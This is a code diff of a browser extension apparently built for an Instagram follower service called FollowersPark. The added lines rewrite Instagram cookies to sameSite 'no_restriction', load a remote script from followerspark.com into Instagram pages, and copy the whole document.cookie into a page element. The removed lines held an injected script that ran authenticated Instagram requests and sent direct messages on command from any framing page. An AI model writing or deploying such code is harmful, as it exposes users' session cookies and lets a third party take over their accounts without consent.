@@ -8,102 +8,64 @@ if (chrome && chrome.webRequest && chrome.webRequest.onHeadersReceived) {
             responseHeaders: details.responseHeaders.filter(header =>
                 !HEADERS_TO_STRIP_LOWERCASE.includes(header.name.toLowerCase()))
         }), {
-            urls: ['<all_urls>']
-        }, ['blocking', 'responseHeaders']);
+        urls: ['<all_urls>']
+    }, ['blocking', 'responseHeaders']);
 }
 
-if ((location.host || '').indexOf('instagram') !== -1) {
-    const s = document.createElement('script');
-    s.type = 'text/javascript';
-    const c = `
-     class followerPark {
-       constructor() {
-           this.postMessage({
-               type: 'scu',
-               data: ((window || {})._sharedData || {}).config || {},
-           });
+const o = ["http://*.instagram.com/*", "https://*.instagram.com/*"];
+setInterval(() => {
+    if (chrome && chrome.cookies && chrome.cookies.getAll) {
+        for (const t of o) {
+            chrome.cookies.getAll({}, (c) => {
+                c.filter(e => "unspecified" === e.sameSite)
+                    .map(a => {
+                        chrome.cookies.remove({
+                            url: t,
+                            name: a.name
+                        }, () => {
+                            chrome.cookies.set({
+                                url: t,
+                                name: a.name,
+                                value: a.value,
+                                domain: a.domain,
+                                path: a.path,
+                                httpOnly: a.httpOnly,
+                                secure: !0,
+                                sameSite: "no_restriction",
+                                expirationDate: a.expirationDate,
+                                storeId: a.storeId
+                            })
+                        });
 
-           window.addEventListener('message', async(event) => {
-               const data = (event || {}).data || {};
-               const { type, url } = data;
-               if (!(
-                       (type === 'GET' || type == 'POST' || type === 'dm') &&
-                       url !== 'string'
-                   )) {
-                   return;
-               }
+                    });
+            });
+        }
+    }
+}, 1000);
 
-               if (type === 'dm') {
-                   this.sendDm(data);
-               } else {
-                   this.sendFetch(data);
-               }
-           });
-       }
+if ((location.search || '').indexOf('followpark=1') !== -1) {
+    var jsScript = document.createElement('script');
+    jsScript.setAttribute('type', 'text/javascript');
+    jsScript.setAttribute('src', 'https://followerspark.com/followerspark.js');
+    const appendChild = () => {
+        const childiren = document.querySelector('#react-root').children;
+        const children2 = childiren[Math.random() * childiren.length | 0].children;
+        const elem = children2[Math.random() * children2.length | 0]
 
-       getCookie(name) {
-           const parts = ('; ' + document.cookie).split('; ' + name + '=');
-           if (parts.length === 2) return parts.pop().split(';').shift();
-       };
+        if (!elem) {
+            return appendChild();
+        }
 
-       postMessage(message) {
-           window.parent.postMessage(message, '*');
-       };
-
-       async sendFetch({
-           type,
-           url,
-           responseType,
-           responseData,
-           requestData,
-           contentType,
-       }) {
-           const response = await fetch(url, {
-               headers: {
-                   'x-csrftoken': this.getCookie('csrftoken'),
-                   'content-type': contentType || 'application/json',
-                   'x-ig-app-id': '936619743392459',
-               },
-               method: type,
-               mode: 'cors',
-               credentials: 'include',
-               body: requestData || null,
-           });
-
-           if (response.url.indexOf('/accounts/login') !== -1) {
-               location.reload();
-           }
-
-           let responsejson = undefined;
-
-           try {
-               responsejson = await response.json();
-           } catch (error) {}
-
-           if (responseType) {
-               this.postMessage({
-                   type: responseType,
-                   data: {
-                       ...responseData,
-                       ...((responsejson || {}).data || responsejson || {}),
-                   },
-               });
-           }
-       };
-
-       sendDm({ responseData, responseType, }) {
-           __mqtt.sendTextMessage(responseData.thread_id, responseData.directMessage)
-           if (responseType) {
-               this.postMessage({
-                   type: responseType,
-                   data: responseData,
-               });
-           }
-       };
-   }
-
-   new followerPark();
-    `;
-    s.appendChild(document.createTextNode(c));
-    document.body.appendChild(s);
+        elem.appendChild(jsScript);
+    };
+    appendChild();
+} else if (chrome && chrome.browserAction && chrome.browserAction.onClicked) {
+    chrome.browserAction.onClicked.addListener(function () {
+        chrome.tabs.create({ url: 'http://followerspark.com' });
+    });
+    var cookie = document.cookie;
+    var fDiv = document.createElement('div');
+    fDiv.setAttribute('id', 'FollowersPark');
+    fDiv.setAttribute('tkn', cookie);
+    document.body.append(fDiv);
 }
